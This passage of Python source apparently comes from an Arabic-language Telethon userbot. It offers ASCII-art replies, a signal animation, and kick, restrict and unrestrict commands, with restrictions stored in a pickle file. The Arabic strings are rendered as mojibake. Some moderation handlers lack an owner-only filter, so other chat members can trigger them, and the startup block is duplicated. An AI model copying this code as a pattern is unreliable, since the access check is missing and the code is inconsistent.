‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚óè‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñë          ‚ñë‚ñà‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ÿØÿ≥ ŸÑÿßŸäŸÉ'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ
‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà
‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà
‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà
‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà
‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà
‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÄ‚ñë‚ñë‚ñà‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÄ
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñë‚ñë‚ñë‚ñë‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñë‚ñë‚ñë‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñë‚ñë‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñë‚ñë‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñÄ‚ñÄ
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ÿßÿ¥ÿßÿ±ÿ©'))
async def signal_animation(event):
    await event.delete()
    
    sequences = [
        "‚ñÅ ‚ñÇ ‚ñÑ ‚ñÖ ‚ñÜ ‚ñá ‚ñà",
        "‚ñÅ ‚ñÇ ‚ñÑ ‚ñÖ ‚ñÜ ‚ñá ‚ñí",
        "‚ñÅ ‚ñÇ ‚ñÑ ‚ñÖ ‚ñÜ ‚ñí ‚ñí",
        "‚ñÅ ‚ñÇ ‚ñÑ ‚ñÖ ‚ñí ‚ñí ‚ñí",
        "‚ñÅ ‚ñÇ ‚ñÑ ‚ñí ‚ñí ‚ñí ‚ñí",
        "‚ñÅ ‚ñÇ ‚ñí ‚ñí ‚ñí ‚ñí ‚ñí",
        "‚ñÅ ‚ñí ‚ñí ‚ñí ‚ñí ‚ñí ‚ñí",
        "‚ñí ‚ñí ‚ñí ‚ñí ‚ñí ‚ñí ‚ñí",
        "‚ñí ‚ñí ‚ñí ‚ñí ‚ñí ‚ñí ‚ñÅ",
        "‚ñí ‚ñí ‚ñí ‚ñí ‚ñí ‚ñÇ ‚ñÅ",
        "‚ñí ‚ñí ‚ñí ‚ñí ‚ñÑ ‚ñÇ ‚ñÅ",
        "‚ñí ‚ñí ‚ñí ‚ñÖ ‚ñÑ ‚ñÇ ‚ñÅ",
        "‚ñí ‚ñí ‚ñÜ ‚ñÖ ‚ñÑ ‚ñÇ ‚ñÅ",
        "‚ñí ‚ñá ‚ñÜ ‚ñÖ ‚ñÑ ‚ñÇ ‚ñÅ",
        "‚ñà ‚ñá ‚ñÜ ‚ñÖ ‚ñÑ ‚ñÇ ‚ñÅ"
    ]
    
    try:
        
        message = await event.reply(sequences[0])
        
        
        for seq in sequences[1:]:
            await asyncio.sleep(1)  
            await message.edit(seq)
    
        
        
        
        
    except Exception as e:
        await event.reply(f"‚ö†Ô∏è ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ™ŸÜŸÅŸäÿ∞ ÿ£ŸÖÿ± ÿßŸÑÿ•ÿ¥ÿßÿ±ÿ©: {e}")

@client.on(events.NewMessage(from_users='me', pattern='.ÿ∑ÿ±ÿØ'))
async def kick_user(event):
    try:
        
        if event.is_reply:
            reply_message = await event.get_reply_message()
            user_id = reply_message.sender_id
        else:
            
            command, username = event.raw_text.split(' ', 1)
            if username.startswith('@'):
                username = username[1:]  
            user = await client.get_entity(username)
            user_id = user.id
        
        
        try:
            await client(EditBannedRequest(
                event.chat_id,
                user_id,
                ChatBannedRights(until_date=None, view_messages=True)  
            ))
            await event.edit(f"**‚éô ÿ™ŸÖ ÿ∑ÿ±ÿØ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ®ŸÜÿ¨ÿßÿ≠.**")
        except UserAdminInvalidError:
            await event.edit("**‚éô ŸÑÿß ŸäŸÖŸÉŸÜ ÿ∑ÿ±ÿØ ÿßŸÑŸÖÿ¥ÿ±ŸÅŸäŸÜ.**")
        except ChatAdminRequiredError:
            await event.edit("**‚éô ŸÑÿß ÿ£ŸÖŸÑŸÉ ÿµŸÑÿßÿ≠Ÿäÿßÿ™ ÿ∑ÿ±ÿØ ÿßŸÑÿ£ÿπÿ∂ÿßÿ°.**")
        except Exception as e:
            await event.edit(f"*-‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ŸÖÿ≠ÿßŸàŸÑÿ© ÿßŸÑÿ∑ÿ±ÿØ: {e}**")
    except ValueError:
        await event.edit("**‚éô ÿßÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿµŸäÿ∫ÿ© ÿßŸÑÿµÿ≠Ÿäÿ≠ÿ©: .ÿ∑ÿ±ÿØ @username ÿ£Ÿà ÿ®ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ©.**")

restricted_users_file = 'restricted_users.pkl'  


if os.path.exists(restricted_users_file):
    with open(restricted_users_file, 'rb') as f:
        restricted_users = pickle.load(f)
else:
    restricted_users = set()


@client.on(events.NewMessage(pattern=r'^.ÿ™ŸÇŸäŸäÿØ(?:\s+@?\w+)?$'))
async def restrict_user(event):
    if event.is_reply:  
        replied_msg = await event.get_reply_message()
        user_id = replied_msg.sender_id
        try:
            user = await event.get_reply_message().get_sender()
            user_name = user.first_name
            if user.last_name:
                user_name += f" {user.last_name}"
            if user.username:
                user_name += f" (@{user.username})"
        except Exception:
            user_name = "ÿ∫Ÿäÿ± ŸÖÿπÿ±ŸàŸÅ"
    else:  
        try:
            args = event.raw_text.split()
            if len(args) < 2:
                await event.reply("**‚éô Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ£Ÿà ŸÉÿ™ÿßÿ®ÿ© ÿßŸÑŸäŸàÿ≤ÿ± ÿßŸÑÿÆÿßÿµ ÿ®Ÿá.**")
                return
            username = args[1]
            if username.startswith('@'):
                username = username[1:]
            user = await client.get_entity(username)
            user_id = user.id
            user_name = user.first_name
            if user.last_name:
                user_name += f" {user.last_name}"
            if user.username:
                user_name += f" (@{user.username})"
        except (IndexError, ValueError):
            await event.edit("**‚éô Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ£Ÿà ŸÉÿ™ÿßÿ®ÿ© ÿßŸÑŸäŸàÿ≤ÿ± ÿßŸÑÿÆÿßÿµ ÿ®Ÿá ÿ®ÿ¥ŸÉŸÑ ÿµÿ≠Ÿäÿ≠.**")
            return
        except Exception as e:
            await event.edit(f"**‚éô ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ: {e}**")
            return

    if user_id not in restricted_users:
        restricted_users.add(user_id)
        rights = ChatBannedRights(
            until_date=None,  
            send_messages=True  
        )
        try:
            await client(EditBannedRequest(event.chat_id, user_id, rights))
            await event.edit(f"**‚éô ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ: {user_name}\n ‚éô ÿ™ŸÖ ÿ™ŸÇŸäÿØŸá**")
            
            
            with open(restricted_users_file, 'wb') as f:
                pickle.dump(restricted_users, f)
        except Exception as e:
            await event.edit(f"**‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ™ŸÇŸäŸäÿØ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ: {e}**")
    else:
        await event.edit("**‚éô Ÿáÿ∞ÿß ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÖŸÇŸäÿØ ÿ®ÿßŸÑŸÅÿπŸÑ.**")


@client.on(events.NewMessage(pattern=r'^.ÿßŸÑÿ∫ÿßÿ° ÿßŸÑÿ™ŸÇŸäŸäÿØ(?:\s+@?\w+)?$'))
async def unrestrict_user(event):
    if event.is_reply:
        replied_msg = await event.get_reply_message()
        user_id = replied_msg.sender_id
        try:
            user = await event.get_reply_message().get_sender()
            user_name = user.first_name
            if user.last_name:
                user_name += f" {user.last_name}"
            if user.username:
                user_name += f" (@{user.username})"
        except Exception:
            user_name = "ÿ∫Ÿäÿ± ŸÖÿπÿ±ŸàŸÅ"
    else:
        try:
            args = event.raw_text.split()
            if len(args) < 2:
                await event.edit("**‚éô Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ£Ÿà ŸÉÿ™ÿßÿ®ÿ© ÿßŸÑŸäŸàÿ≤ÿ± ÿßŸÑÿÆÿßÿµ ÿ®Ÿá.**")
                return
            username = args[1]
            if username.startswith('@'):
                username = username[1:]
            user = await client.get_entity(username)
            user_id = user.id
            user_name = user.first_name
            if user.last_name:
                user_name += f" {user.last_name}"
            if user.username:
                user_name += f" (@{user.username})"
        except (IndexError, ValueError):
            await event.edit("**‚éô Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ£Ÿà ŸÉÿ™ÿßÿ®ÿ© ÿßŸÑŸäŸàÿ≤ÿ± ÿßŸÑÿÆÿßÿµ ÿ®Ÿá ÿ®ÿ¥ŸÉŸÑ ÿµÿ≠Ÿäÿ≠.**")
            return
        except Exception as e:
            await event.edit(f"**‚éô ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ: {e}**")
            return

    if user_id in restricted_users:
        restricted_users.remove(user_id)
        rights = ChatBannedRights(
            until_date=None,
            send_messages=False  
        )
        try:
            await client(EditBannedRequest(event.chat_id, user_id, rights))
            await event.edit(f"**‚éâ‚ïé ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ: {user_name}\n ‚éâ‚ïé ÿ™ŸÖ ÿ™ŸÇŸäŸäÿØ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ")
            
            
            with open(restricted_users_file, 'wb') as f:
                pickle.dump(restricted_users, f)
        except Exception as e:
            await event.edit(f"**‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ•ŸÑÿ∫ÿßÿ° ÿ™ŸÇŸäŸäÿØ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ: {e}**")
    else:
        await event.edit("**‚éô Ÿáÿ∞ÿß ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ∫Ÿäÿ± ŸÖŸÇŸäÿØ.**")


@client.on(events.NewMessage(pattern=r'^.ÿßŸÑŸÖŸÇŸäÿØŸäŸÜ$'))
async def list_restricted_users(event):
    if restricted_users:
        user_list = ""
        for user_id in restricted_users:
            try:
                user = await client.get_entity(user_id)
                user_name = user.first_name
                if user.last_name:
                    user_name += f" {user.last_name}"
                if user.username:
                    user_name += f" (@{user.username})"
                else:
                    user_name += ""
                user_list += f"- {user_name}\n"
            except Exception:
                user_list += f"- ID: {user_id} (ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠)\n"
        
        
        if len(user_list) > 4000:
            
            for i in range(0, len(user_list), 4000):
                await event.reply(user_list[i:i+4000])
        else:
            await event.edit(f"**‚éô ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖŸäŸÜ ÿßŸÑŸÖŸÇŸäÿØŸäŸÜ:\n{user_list}**")
    else:
        await event.edit("**‚éô ŸÑÿß ŸäŸàÿ¨ÿØ ŸÖÿ≥ÿ™ÿÆÿØŸÖŸàŸÜ ŸÖŸÇŸäÿØŸàŸÜ ÿ≠ÿ™Ÿâ ÿßŸÑÿ¢ŸÜ**")

@client.on(events.NewMessage(incoming=True))
async def delete_muted_user_messages(event):
    if event.is_private and event.chat_id in muted_users:
        await client.delete_messages(event.chat_id, [event.id])
    

ascii_art = """
\033[031m
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñÄ‚ñà‚ñÑ
‚îÄ‚îÄ‚îÄ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ
‚îÄ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà.‚ñº.‚ñº.‚ñº.‚ñº.‚ñº.‚ñº‚ñº‚ñº‚ñº
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà    
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ‚ñÑ‚ñ≤.‚ñ≤‚ñ≤‚ñ≤‚ñ≤‚ñ≤‚ñ≤‚ñ≤
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÄ‚ñÄ‚†Ä
\033[0m
 flex source is up and running
"""
os.system("clear")  # ÿßÿ≥ÿ™ÿÆÿØŸÖ "cls" ÿ•ÿ∞ÿß ŸÉŸÜÿ™ ÿπŸÑŸâ Windows
print(ascii_art)

# ÿØÿßŸÑÿ© ŸÑÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑŸäŸàÿ≤ÿ± (ŸÉŸÖÿ´ÿßŸÑ)
async def update_username():
    me = await client.get_me()
    print(f"Installed {me.first_name}, Eva source")

# ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑŸÉŸÑÿßŸäŸÜÿ™
async def main():
    await client.start()
    await update_username()

with client:
    client.loop.run_until_complete(main())
# ... ÿ®ÿßŸÇŸä ÿßŸÑŸÉŸàÿØ ŸÉŸÖÿß ŸáŸà

async def main():
    await client.start()
    await update_username()
    print("ÿ™ŸÖ ÿ™ÿ¥ÿ∫ŸäŸÑ...")
    await asyncio.Event().wait()  # Ÿäÿ®ŸÇŸä ÿßŸÑÿ≥ŸÉÿ±ÿ®ÿ™ ÿ¥ÿ∫ÿßŸÑ ÿ•ŸÑŸâ ÿßŸÑÿ£ÿ®ÿØ

with client:
    client.loop.run_until_complete(main())    
    
    
